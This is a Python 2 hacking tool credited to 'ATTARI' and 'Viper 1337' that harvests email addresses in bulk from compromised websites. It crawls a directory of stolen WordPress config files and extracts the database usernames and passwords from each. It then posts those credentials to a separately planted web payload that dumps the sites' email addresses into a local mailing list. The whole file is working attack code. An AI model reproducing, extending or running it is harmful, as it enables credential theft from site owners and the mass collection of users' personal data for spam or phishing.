import requests
from bs4 import BeautifulSoup

from colorama import Fore								
from colorama import Style								
from colorama import init												
init(autoreset=True)
fr  =   Fore.RED
fh  =   Fore.RED
fc  =   Fore.CYAN
fo  =   Fore.MAGENTA
fw  =   Fore.WHITE
fy  =   Fore.YELLOW
fbl =   Fore.BLUE
fg  =   Fore.GREEN											
sd  =   Style.DIM
fb  =   Fore.RESET
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT
from platform import system
import os,sys,time
try:
    os.system('title Mass email grabber from config of the shell')
except:
    pass
if system() == 'Windows':
    os.system('cls')
elif system() == 'Linux':
    os.system('clear')
else:
    pass
def nadafa():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
    else:
        pass
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
def intro(word,ok):
    nadafa()
    print '\n\n\n'
    print '\n\n\n'
    print '\n'
    #print logo
    #print '\n'
    print(ok)
    atx(word)
def nejmaf(site):
    print('{}{}[').format(fy,sb),('{}{}+').format(fg,sb),('{}{}]').format(fy,sb),('{}{}[Not Found...]').format(fr,sb),site
def nejmav(site):
    print('{}{}[').format(fy,sb),('{}{}+').format(fg,sb),('{}{}]').format(fy,sb),('{}{}[Found...]').format(fg,sb),site
def atx(s):
    for c in s + '\n':
        bb = ('{}{}'+c).format(fh,sb)
        sys.stdout.write(bb)
        sys.stdout.flush()
        time.sleep(4. / 60)

if system() == 'Windows':
    os.system('cls')
elif system() == 'Linux':
    os.system('clear')
else:
    pass
intro('\t\t\t     Coded By ATTARI','')
nadafa()
logo = ('''{}{}\n\n\n\n\n\n
                                                                 
\t _____                          _ _                _   _           
\t|     |___ ___ ___    _____ ___|_| |   ___ ___ ___| |_| |_ ___ ___ 
\t| | | | .'|_ -|_ -|  |     | .'| | |  | . |  _| .'| . | . | -_|  _|
\t|_|_|_|__,|___|___|  |_|_|_|__,|_|_|  |_  |_| |__,|___|___|___|_|  
\t                                      |___|                        
                                                           Wait The Magic
                                                           Coded By Viper 1337
                                                           Fb.com/viper1337official
                                                           
''').format(fr,sb)

print logo
def mail():
    how = []
    payload = raw_input(('{}{}* Give Link Of the payload: ').format(fb,sb))
    link = raw_input(('{}{}* Give Directory of The config: ').format(fb,sb))
    r = requests.get(link)
    html = r.content
    soup = BeautifulSoup(html,'html.parser')
    for i in soup.findAll('a'):
        hkr = i.get('href')
        rr = requests.get(link+'/'+str(hkr))
        htmlr = rr.content
        htmlr = htmlr.split('MySQL database username')
        for c in htmlr:
            if "define('DB_USER'" in c:
                c =c.split('MySQL hostname')
                for b in c:
                    if "define('DB_USER'" in b:
                        b=b.split('define')
                        for k in b:
                            if "DB_USER" in k:
                                k = k.replace('\n','')
                                k = k.replace("');","")
                                k = k.replace("('DB_USER', '",'')
                                k = k.replace('/** MySQL database password */','')
                                user = k
                            if "DB_PASSWORD" in k:
                                k = k.replace("/** ","")
                                k = k.replace('\n','')
                                k = k.replace("');","")
                                k = k.replace("('DB_PASSWORD', '","")
                                pwd=k
                                poster(how,user,pwd,payload)
                    else:
                        pass
            else:
                pass
        

def poster(h,b,c,link):
    
    data = {'server':'localhost',
            'user':b,
            'pw':c}
    ok = requests.get(link)
    if 'Coded By Attari' in ok.content:
        try:
            r = requests.post(link,data=data)
            ht =r.content
            ht = ht.replace("<title>Payload Of Mass Email grabber</title>",'')
            ht = ht.replace("<!DOCTYPE html>","")
            ht = ht.replace("<html>","")
            ht = ht.replace("<head>","")
            ht = ht.replace("</head>","")
            ht = ht.replace("<style>","")
            ht = ht.replace("body{","")
            ht = ht.replace("padding: 0;","")
            ht=ht.replace("background-image: url('https://static1.squarespace.com/static/54d09890e4b01d126f05a2e1/56c33e16b654f95147f1749a/56cdf9d6c2ea510fbd51bbae/1456339458974/Original.gif');","")
            ht = ht.replace("margin: 0;","")
            ht = ht.replace("/*background-repeat: no-repeat;*/","")
            ht = ht.replace("background-size: 105%;","")
            ht = ht.replace("}","")
            ht = ht.replace(".div{","")
            ht = ht.replace("padding-top: 25px;","")
            ht = ht.replace("margin-top: 80px;","")
            ht = ht.replace("width: 70%;","")
            ht = ht.replace("background: rgba(255, 255, 255, 0.8);","")
            ht = ht.replace("padding-bottom: 25px;","")
            ht = ht.replace(".tit{","")
            ht = ht.replace('font-family: "Comic Sans MS", cursive, sans-serif;',"")
            ht = ht.replace("p{","")
            ht = ht.replace("{","")
            ht = ht.replace("padding-left: 20px;","")
            ht = ht.replace("text-align: left;","")
            ht = ht.replace("</style>","")
            ht = ht.replace("<body>","")
            ht = ht.replace('<center><div class="div">',"")
            ht = ht.replace('<h1 class="tit">Coded By Attari</h1>',"")
            ht = ht.replace("<p>* Dear user</p>","")          
            ht = ht.replace('''</div></center>''',"")
            ht = ht.replace('''</body>''',"")
            ht = ht.replace('''</html>''',"")
            ht = ht.replace('font-family: "Comic Sans MS", cursive, sans-serif	;',"")
            ht = ht.replace("","")
            ht = ht.split('\n')
            for i in ht:
                if i == '':
                    pass
                elif "connected" in i:
                    pass
                elif len(i) < 9:
                    pass
                else:
                    if i in h:
                        pass
                    else:
                        h.append(i)
                        nwimra = str(len(h))
                        print ('{}{}[*'+nwimra+'==>] ').format(fg,sb),('{}{}'+i).format(fy,sb)
                        with open("maillist.txt",'a') as l:
                            l.writelines(i+'\n')
        except:
            pass
    else:
        print "Please you don't have the original payload"

mail()









